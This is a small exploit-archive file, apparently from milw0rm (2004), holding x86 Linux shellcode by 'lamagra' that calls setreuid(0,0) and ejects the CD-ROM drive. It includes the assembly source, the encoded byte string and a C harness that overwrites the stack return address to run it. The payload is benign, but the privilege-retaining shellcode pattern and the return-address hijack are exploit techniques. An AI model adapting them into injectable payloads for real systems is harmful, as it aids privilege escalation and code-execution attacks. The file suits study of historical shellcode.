/*
        CDROM EJECTING CODE by lamagra

.data
.globl main
        .type    main,@function
_start:
        # setreuid (0, 0)
        xorl %eax,%eax
        xorl %ebx,%ebx
        xorl %ecx,%ecx
        xorl %edx,%edx
        movb $70,%al
        int  $0x80

        jmp 0x21
        popl %esi
        movb %edx,10(%esi)
        leal (%esi), %ebx
        # open("/dev/cdrom", O_RDONLY|O_NONBLOCK|0x4, 666)
        movb $5, %al
        movw $0x804, %cx
        movw $666, %dx
        int $0x80

        movl %eax, %ebx

        # ioctl(%eax, 0x5309, 0)
        movb $54, %al
        movw $21257, %cx

        int $0x80

        # exit(0)
        xorl %eax, %eax
        xorl %ebx, %ebx
        inc %eax
        int $0x80
        call -0x26
	.string "/dev/cdrom"
*/
#include <stdio.h>

char eject[] =
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x46\xcd\x80\xeb\x23\x5e\x88\x56\x0a\x8d"
"\x1e\xb0\x05\x66\xb9\x04\x08\x66\xba\x9a\x02\xcd\x80\x89\xc3\xb0\x36\x66\xb9"
"\x09\x53\xcd\x80\x31\xc0\x31\xdb\x40\xcd\x80\xe8\xd8\xff\xff\xff/dev/cdrom";

main() {
        int *ret;
        ret=(int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(eject));
        (*ret) = (int)eject;
}

// milw0rm.com [2004-09-26]